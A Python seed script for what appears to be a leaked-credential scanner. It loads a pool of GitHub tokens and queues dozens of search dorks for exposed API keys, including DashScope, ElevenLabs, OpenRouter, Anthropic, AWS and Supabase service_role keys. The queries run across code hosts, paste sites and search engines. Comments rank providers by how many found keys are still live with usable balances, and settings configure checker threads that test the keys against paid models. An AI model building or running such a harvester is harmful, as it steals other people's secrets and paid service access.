#!/usr/bin/env python3
"""Seed settings + GitHub PAT pool into the scanner DB once the schema exists.

Render free has an ephemeral disk: every deploy starts from an empty database,
so the operator PAT pool and card settings must be re-applied on boot.
Reads: DB_PATH, GH_PATS_B64 (base64 of whitespace-separated tokens), AUTO_CARDS.
"""
import base64
import os
import sqlite3
import sys
import time


# Provider dorks: DashScope first, then the pools we actually consume.
# A handful of high-signal queries per repo host beats 20 generic sources.
PROVIDER_DORKS = [
    # --- full-access DashScope: keys that serve qwen3.8-max / deepseek-v4-pro / glm-5.3 ---
    ('"qwen3.8-max" "sk-"', 1116),
    ('"qwen3.8-max" "DASHSCOPE_API_KEY"', 1115),
    ('"qwen3-max" "sk-" "dashscope"', 1114),
    ('"deepseek-v4-pro" "dashscope"', 1113),
    ('"glm-5.3" "dashscope" "sk-"', 1112),
    ('"sk-ws-" "dashscope"', 1111),
    ('"sk-ws-" "aliyuncs"', 1110),
    ('"dashscope-intl.aliyuncs.com" "sk-"', 1109),
    ('"DASHSCOPE_API_KEY" "qwen3.8"', 1108),
    ('"DASHSCOPE_API_KEY" filename:.env', 1107),
    ('"dashscope.aliyuncs.com" "qwen3.8-max"', 1106),
    ('"bailian" "sk-" "dashscope"', 1105),
    ('"compatible-mode/v1" "qwen3.8-max"', 1104),
    ('"dashscope" "qwen3.8-27b" "sk-"', 1103),
    ('"dashscope" "deepseek-v4.1-flash-1017"', 1102),
    ('"ALIBABA_API_KEY" "dashscope"', 1101),
    # --- ElevenLabs: высокая отдача (реальные остатки символов) ---
    ('"xi-api-key"', 1000),
    ('"xi-api-key" filename:.env', 995),
    ('"ELEVENLABS_API_KEY"', 990),
    ('"elevenlabs" "sk_"', 985),
    ('"api.elevenlabs.io" "xi-api-key"', 980),
    ('"ELEVEN_LABS_API_KEY"', 975),
    ('"xi-api-key" path:config', 970),
    # --- OpenRouter / Groq / NVIDIA / HF ---
    ('"sk-or-v1-"', 940),
    ('"OPENROUTER_API_KEY"', 938),
    ('"openrouter.ai/api/v1" "sk-or-"', 936),
    ('"gsk_" "api.groq.com"', 930),
    ('"GROQ_API_KEY"', 928),
    ('"nvapi-"', 920),
    ('"integrate.api.nvidia.com" "nvapi-"', 918),
    ('"huggingface" "hf_" filename:.env', 910),
    ('"HF_TOKEN"', 908),
    # --- Google / DeepSeek / SiliconFlow / Moonshot / ZAI ---
    ('"AIza" "generativelanguage.googleapis.com"', 900),
    ('"GEMINI_API_KEY"', 898),
    ('"api.deepseek.com" "sk-"', 890),
    ('"DEEPSEEK_API_KEY"', 888),
    ('"api.siliconflow.cn" "sk-"', 880),
    ('"SILICONFLOW_API_KEY"', 878),
    ('"api.moonshot" "sk-"', 870),
    ('"MOONSHOT_API_KEY"', 868),
    ('"api.z.ai" "sk-"', 860),
    ('"ZHIPU_API_KEY"', 858),
    # --- DashScope: много находок, мало живых; ценны только sk-ws- ---
    ('"sk-ws-" "dashscope"', 855),
    ('"sk-ws-" "aliyuncs"', 853),
    ('"DASHSCOPE_API_KEY"', 851),
    ('"dashscope-intl.aliyuncs.com"', 849),
    ('"compatible-mode/v1" "sk-"', 847),
    # --- прочие провайдеры ---
    ('"xai-" "api.x.ai"', 840),
    ('"sk-ant-" "api.anthropic.com"', 838),
    ('"r8_" "api.replicate.com"', 830),
    ('"fal-key" "fal.run"', 828),
    ('"pplx-"', 820),
    ('"csk-" "api.cerebras.ai"', 818),
    ('"api.mistral.ai" "sk-"', 810),
    ('"api.cohere.ai" "sk-"', 808),
    ('"api.deepgram.com" "Token"', 800),
    ('"api.assemblyai.com" "sk_"', 798),
    ('"re_" "api.resend.com"', 790),
    ('"SG." "api.sendgrid.com"', 788),
    ('"api.telegram.org/bot"', 780),
    ('"service_role" "supabase.co"', 770),
    ('"CLOUDFLARE_API_TOKEN"', 760),
    ('"AKIA" "aws_access_key_id" filename:.env', 750),
    ('"api.stability.ai" "sk-"', 740),
    ('"api.voyageai.com" "pa-"', 730),
    ('"jina_" "api.jina.ai"', 720),
    ('"tvly-"', 710),
    ('"fc-" "api.firecrawl.dev"', 700),
    ('"modal.token"', 690),
    ('"rpa_" "api.runpod.ai"', 680),
    ('"api_token" "bria"', 670),
    ('"camb.ai" "x-api-key"', 660),
    # --- классы с нулевой отдачей: держим низко, только для полноты ---
    ('"api.together.xyz" "sk-"', 400),
    ('"OPENAI_API_KEY"', 390),
    ('"api.fish.audio"', 380),
]

SOURCE_LANES = [
    ("github", 0),
    ("gitlab", -30),
    ("gist", -60),
    ("hf", -90),
    ("pastegg", -120),
    ("bing", -150),
    ("ddg", -180),
]


def seed_dorks(con, node_idx, node_n):
    """Provider-focused search queue, sharded across nodes."""
    tasks = []
    for query, weight in PROVIDER_DORKS:
        for lane, pen in SOURCE_LANES:
            tasks.append((lane, query, weight + pen))
    added = 0
    shard_n = max(1, min(4, node_n))  # 4 groups: keeps the per-node cycle long enough that
    shard_i = node_idx % shard_n      # repeated queries actually return fresh results
    for i, (lane, query, prio) in enumerate(tasks):
        if i % shard_n != shard_i:
            continue
        cur = con.execute(
            "INSERT OR IGNORE INTO source_tasks(source,query,priority,enabled) VALUES(?,?,?,1)",
            (lane, query, prio))
        added += cur.rowcount
        if cur.rowcount == 0:
            con.execute(
                "UPDATE source_tasks SET priority=?, enabled=1 WHERE source=? AND query=?",
                (prio, lane, query))
    active = con.execute("select count(*) from source_tasks where enabled=1").fetchone()[0]
    return added, active


def main() -> int:
    db = os.environ.get("DB_PATH", "/app/data/scanner.db")
    pats_b64 = os.environ.get("GH_PATS_B64", "")
    auto_cards = os.environ.get("AUTO_CARDS", "1")
    auto_batch = os.environ.get("AUTO_BATCH", "4")
    node_idx = int(os.environ.get("NODE_IDX", "0") or 0)
    node_n = max(int(os.environ.get("NODE_N", "1") or 1), 1)

    deadline = time.time() + 180
    while time.time() < deadline:
        time.sleep(5)
        try:
            con = sqlite3.connect(db, timeout=10)
            con.execute("select 1 from pats limit 1")
        except Exception:
            continue
        try:
            for k, v in (("auto_cards", auto_cards), ("auto", "1"),
                         ("auto_batch", auto_batch),
                         ("pat_burst", os.environ.get("PAT_BURST", "8")),
                         ("concurrency", os.environ.get("CONCURRENCY", "40")),
                         ("probe_concurrency", os.environ.get("PROBE_CONCURRENCY", "8")),
                         ("deep_concurrency", os.environ.get("DEEP_CONCURRENCY", "16")),
                         ("page_concurrency", os.environ.get("PAGE_CONCURRENCY", "8")),
                         ("checker_threads", os.environ.get("CHECKER_THREADS", "32")),
                         ("notify_limit", os.environ.get("NOTIFY_LIMIT", "0")),
                         ("checker_models", os.environ.get("CHECKER_MODELS", "10"))):
                con.execute("INSERT OR REPLACE INTO settings(key,value) VALUES(?,?)", (k, v))
            offered = 0
            if pats_b64:
                raw = base64.b64decode(pats_b64).decode("utf-8", "ignore")
                for t in raw.split():
                    t = t.strip()
                    if not t.startswith(("ghp_", "github_pat_")):
                        continue
                    con.execute(
                        "INSERT OR IGNORE INTO pats(token,provider,status,search_lane,added_at) "
                        "VALUES(?,?,?,?,strftime('%s','now'))",
                        (t, "github", "alive", "pat"),
                    )
                    offered += 1
            con.commit()
            alive = con.execute("select count(*) from pats where status='alive'").fetchone()[0]
            added, active = seed_dorks(con, node_idx, node_n)
            con.commit()
            print("[seed] auto_cards=%s pats=%d alive=%d | dorks added=%d active=%d (node %d/%d)"
                  % (auto_cards, offered, alive, added, active, node_idx + 1, node_n), flush=True)
            return 0
        except Exception as exc:
            print("[seed] retry:", repr(exc)[:120], flush=True)
            time.sleep(5)
    print("[seed] gave up: schema never appeared", flush=True)
    return 1


if __name__ == "__main__":
    sys.exit(main())